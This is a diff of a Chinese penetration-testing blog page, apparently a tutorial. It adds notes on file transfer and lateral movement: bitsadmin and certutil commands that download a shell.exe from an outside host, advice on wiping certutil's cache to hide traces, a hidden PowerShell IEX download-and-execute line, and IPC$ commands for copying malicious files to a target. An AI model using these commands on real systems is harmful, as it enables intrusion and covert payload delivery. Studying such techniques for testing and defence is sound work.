@@ -406,14 +406,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-03-22
+                    2024-03-23
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.2k
+                    3.3k
                 </div>
                 
 
@@ -541,18 +541,24 @@ powershell (new-object System.Net.WebClient).DownloadFile(&#39;目标文件地�
 远程执行命令：
 powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;目标文件地址&#39;))&quot;
 </code></pre>
-<h4 id="Bitsadmin"><a href="#Bitsadmin" class="headerlink" title="Bitsadmin"></a>Bitsadmin</h4><pre><code>bitsadmin /transfer n 目标文件地址 保存路径文件名
+<h4 id="Bitsadmin"><a href="#Bitsadmin" class="headerlink" title="Bitsadmin"></a>Bitsadmin</h4><p>  BITSAdmin用于创建、下载和上传作业，监视其进度。Windows7及以后的系统自带BitsAdmin工具。</p>
+<pre><code>bitsadmin /transfer test http://192.168.1.1:8000/1.txt c:\users\mytools\a.txt 
+// 创建一个名为test的bitsadmin任务，从192.168.1.1:8000下载1.txt,保存为c:\users\mytools\a.txt
 </code></pre>
-<h4 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h4><p>  用于备份证书服务，由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。<br>  目录为：<code>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code><br><a href="https://smms.app/image/Ki24ZBd6l3vqWme" target="_blank"><img src="https://s2.loli.net/2024/03/21/Ki24ZBd6l3vqWme.png" ></a></p>
+<h4 id="Certutil"><a href="#Certutil" class="headerlink" title="Certutil"></a>Certutil</h4><p>  Certutil 是Windows自带的命令行工具，用于备份证书服务，由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。<br>  目录为：<code>%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code></p>
+<pre><code>certutil -urlcache -split -f http://192.168.1.1:8000/shell.exe c:\users\public\shell.exe 
+//从192.168.1.1:8000下载shell.exe到本地c:\users\public\目录下
+</code></pre>
+<p><a href="https://smms.app/image/Ki24ZBd6l3vqWme" target="_blank"><img src="https://s2.loli.net/2024/03/21/Ki24ZBd6l3vqWme.png" ></a></p>
 <h4 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h4><p><code>wget -b -O filename http://example.com</code>默认覆盖文件</p>
 <h4 id="ipc-文件共享"><a href="#ipc-文件共享" class="headerlink" title="ipc$文件共享"></a>ipc$文件共享</h4><p>  IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。<br>  <strong>漏洞利用条件：</strong><br>  目标主机开启了139和445端口<br>  目标主机管理员开启了ipc$默认共享</p>
 <pre><code>
 net use \\DC的IP\ipc$ &quot;password&quot; /user:&quot;username&quot;   //连接主机
-net use   // 查看当前主机所建立的连接
-dir \\ip\c$   //查看主机目录
-copy 本地文件地址 \\目标\c$   //传输恶意文件
-tasklist /S 主机 /U 用户 /P 密码   // 查看目标主机进程
-net use \\IP /del /y   //删除ipc$
+net use                             // 查看当前主机所建立的连接
+dir \\ip\c$                         //查看主机目录
+copy 本地文件地址 \\目标\c$         //传输恶意文件
+tasklist /S 主机 /U 用户 /P 密码    // 查看目标主机进程
+net use \\IP /del /y                //删除ipc$
 
 &gt;&gt;建立 IPC 常见的错误代码:
 5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限 
@@ -1229,7 +1235,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">153.4k</span>
+                        class="white-color">158.7k</span>
             
             
             
